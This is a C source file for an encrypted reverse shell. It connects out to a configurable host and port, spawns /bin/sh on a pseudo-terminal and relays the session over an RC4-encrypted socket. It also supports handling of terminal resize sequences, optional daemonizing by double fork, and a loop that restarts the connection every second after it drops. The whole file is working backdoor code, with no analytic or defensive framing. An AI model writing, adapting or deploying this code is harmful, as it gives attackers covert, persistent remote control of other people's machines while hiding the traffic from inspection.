#include <errno.h>
#include <netdb.h>
#include <pty.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

// Connection settings
#ifndef ENCRYPTION_KEY
#define ENCRYPTION_KEY "CHANGE_ME"
#endif
#define ENCRYPTION_KEY_LEN (sizeof(ENCRYPTION_KEY) - 1)

#ifndef CONNECT_HOST
#define CONNECT_HOST "localhost"
#endif

#ifndef CONNECT_PORT
#define CONNECT_PORT 2333
#endif

#ifndef SHELL_COMMAND
#define SHELL_COMMAND "/bin/sh"
#endif

#ifndef DAEMONIZE
#define DAEMONIZE 0
#endif

#ifndef DEBUG_PRINT
#define DEBUG_PRINT !DAEMONIZE
#endif

#define BUFFER_LENGTH 4096

// Macros
#define UINT64_TO_BIG_ENDIAN_ARRAY(x, arr)                                     \
  {                                                                            \
    uint64_t _num = (x);                                                       \
    if (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__)                             \
      _num = __builtin_bswap64(_num);                                          \
    memcpy((arr), &_num, sizeof(_num));                                        \
  }

#define SWAP(a, b)                                                             \
  {                                                                            \
    __typeof(a) t;                                                             \
    t = a;                                                                     \
    a = b;                                                                     \
    b = t;                                                                     \
  }

#if DEBUG_PRINT
#define _TO_STRING_DETAIL(x) #x
#define _TO_STRING(x) _TO_STRING_DETAIL(x)
#define PERROR(msg) perror(__FILE__ ":" _TO_STRING(__LINE__) ": " msg);
#else
#define PERROR(msg)
#endif

#define FATAL(msg)                                                             \
  {                                                                            \
    PERROR(msg);                                                               \
    exit(errno ? errno : EXIT_FAILURE);                                        \
  }

#define _ERROR_OP(func_call, fail_op)                                          \
  ({                                                                           \
    __auto_type ret = (func_call);                                             \
    if (ret < 0)                                                               \
      fail_op(#func_call);                                                     \
    ret;                                                                       \
  })
#define ASSERT_ERROR(func_call) _ERROR_OP(func_call, FATAL)
#define CHECK_ERROR(func_call) _ERROR_OP(func_call, PERROR)

typedef struct rc4_state {
  uint8_t i;
  uint8_t j;
  uint8_t s[256];
} rc4_state;

/**
 * RC4 key scheduling
 * @param state RC4 state, initialized with key scheduling
 * @param key key
 * @param keylen key length
 */
void rc4_init(rc4_state *state, const char *key, int keylen) {
  uint8_t j = 0;
  for (int i = 0; i < 256; i++)
    state->s[i] = i;
  for (int i = 0; i < 256; i++) {
    j = (j + state->s[i] + key[i % keylen]) % 256;
    SWAP(state->s[i], state->s[j]);
  }
  state->i = 0;
  state->j = 0;
}

/**
 * RC4 implementation
 * @param state RC4 state
 * @return next byte in the keystream
 */
uint8_t rc4_next(rc4_state *state) {
  state->i = (state->i + 1) % 256;
  state->j = (state->j + state->s[state->i]) % 256;
  SWAP(state->s[state->i], state->s[state->j]);
  return state->s[(state->s[state->i] + state->s[state->j]) % 256];
}

#define CRC64_ECMA_182_POLY 0x42F0E1EBA9EA3693ULL
/**
 * CRC64 implementation based on CRC64-ECMA-182
 * @param s input string
 * @param n input string length
 * @return CRC64 hash
 */
uint64_t crc64(const char *s, size_t n) {
  // Initialization value for the CRC (based on CRC64-ECMA)
  uint64_t crc = 0;

  // Process each byte of the string
  for (size_t i = 0; i < n; i++) {
    crc ^= (uint64_t)(unsigned char)s[i] << 56; // Integrate byte into the CRC
    // Process each bit in the byte
    for (int j = 0; j < 8; j++)
      crc = crc << 1 ^ (crc & (1ULL << 63) ? CRC64_ECMA_182_POLY : 0ULL);
  }

  return crc;
}

/**
 * Connect to a host, host can be a domain name or an IP address
 * @param host host to connect to
 * @param port port to connect to
 * @return socket file descriptor
 */
int connect_to_host(const char *host, int port) {
  int sockfd = -1;
  struct addrinfo hints = {0}, *res, *p;
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  char service[6];
  snprintf(service, sizeof(service), "%d", port);
  ASSERT_ERROR(getaddrinfo(host, service, &hints, &res));

  for (p = res; p != NULL; p = p->ai_next) {
    if ((sockfd = CHECK_ERROR(
             socket(p->ai_family, p->ai_socktype, p->ai_protocol))) < 0)
      continue;
    if (CHECK_ERROR(connect(sockfd, p->ai_addr, p->ai_addrlen)) == 0)
      break;
    ASSERT_ERROR(close(sockfd));
    sockfd = -1;
  }

  freeaddrinfo(res);
  return sockfd;
}

/**
 * Handle terminal resize control sequence
 * @param master master side of the pty
 * @param buffer buffer to handle
 * @param n buffer length
 * @return new buffer length
 */
size_t handle_resize(int master, char *buffer, size_t n) {
  size_t write_len = n;
  char *resize_start = memmem(buffer, n, "\x1b[8;", 4), *resize_end;
  if (resize_start != NULL &&
      (resize_end = memchr(resize_start, 't', n - (resize_start - buffer))) !=
          NULL) {
    resize_end++;
    struct winsize ws;
    int members =
        sscanf(resize_start, "\x1b[8;%hd;%hdt", &ws.ws_row, &ws.ws_col);
    if (members == 2) {
      ASSERT_ERROR(ioctl(master, TIOCSWINSZ, &ws));
      memmove(resize_start, resize_end, write_len - (resize_end - buffer));
      write_len -= resize_end - resize_start;
    }
  }
  return write_len;
}

int main() {
  pid_t pid;

#if DAEMONIZE
  for (int i = 0; i < 2; i++)
    if ((pid = ASSERT_ERROR(fork())) > 0)
      return 0;
#endif

  for (;;) {
    if ((pid = ASSERT_ERROR(fork())) == 0)
      break;
    int status;
    waitpid(pid, &status, 0);
#if DEBUG_PRINT
    if (WIFEXITED(status))
      fprintf(stderr, "child process %d exited with status %d\n", pid,
              WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
      fprintf(stderr, "child process %d exited with signal %s\n", pid,
              strsignal(WTERMSIG(status)));
#endif
    sleep(1);
  }

  // Create a pty and fork a shell
  int master;
  if ((pid = ASSERT_ERROR(forkpty(&master, NULL, NULL, NULL))) == 0)
    return ASSERT_ERROR(execl(SHELL_COMMAND, SHELL_COMMAND, NULL));

  // Create a socket
  int sockfd = ASSERT_ERROR(connect_to_host(CONNECT_HOST, CONNECT_PORT));

  char tag_value[ENCRYPTION_KEY_LEN + sizeof(uint64_t)];
  memcpy(tag_value, ENCRYPTION_KEY, ENCRYPTION_KEY_LEN);
  UINT64_TO_BIG_ENDIAN_ARRAY(time(NULL), tag_value + ENCRYPTION_KEY_LEN);

  char tag[sizeof(uint64_t)];
  UINT64_TO_BIG_ENDIAN_ARRAY(crc64(tag_value, sizeof(tag_value)), tag);

  // mangle encryption key to ensure difference every time
  char mangled_encryption_key[ENCRYPTION_KEY_LEN];
  memcpy(mangled_encryption_key, ENCRYPTION_KEY, ENCRYPTION_KEY_LEN);
  for (size_t i = 0; i < sizeof(mangled_encryption_key); i++)
    mangled_encryption_key[i] ^= tag[i % sizeof(tag)];

  // Send tag
  ASSERT_ERROR(send(sockfd, &tag, sizeof(tag), 0));

  // Initialize RC4 states
  rc4_state rc4recv, rc4send;
  rc4_init(&rc4recv, mangled_encryption_key, sizeof(mangled_encryption_key));
  rc4_init(&rc4send, mangled_encryption_key, sizeof(mangled_encryption_key));

  // Create duplex socket connection by polling
  int fd_max = MAX(sockfd, master);
  char buffer[BUFFER_LENGTH];

  for (;;) {
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(sockfd, &readfds);
    FD_SET(master, &readfds);

    ASSERT_ERROR(select(fd_max + 1, &readfds, NULL, NULL, NULL));

    size_t n;
    // Read from socket and write to pty
    if (FD_ISSET(sockfd, &readfds))
      for (;;) {
        n = ASSERT_ERROR(recv(sockfd, buffer, sizeof(buffer), 0));
        if (n == 0)
          goto end_loop;
        for (size_t i = 0; i < n; i++)
          buffer[i] ^= rc4_next(&rc4recv);

        // Check if resize TTY sequence is received
        size_t write_len = handle_resize(master, buffer, n);
        ASSERT_ERROR(write(master, buffer, write_len));

        // Break if the buffer is not full (i.e., no more data to read)
        if (n < sizeof(buffer))
          break;
      }

    // Read from pty and write to socket
    if (FD_ISSET(master, &readfds))
      for (;;) {
        n = ASSERT_ERROR(read(master, buffer, sizeof(buffer)));
        if (n == 0)
          goto end_loop;
        for (size_t i = 0; i < n; i++)
          buffer[i] ^= rc4_next(&rc4send);
        ASSERT_ERROR(send(sockfd, buffer, n, 0));
        if (n < sizeof(buffer))
          break;
      }
  }

end_loop:
  kill(-pid, SIGTERM);
  shutdown(sockfd, SHUT_WR);
  close(master);
  return 0;
}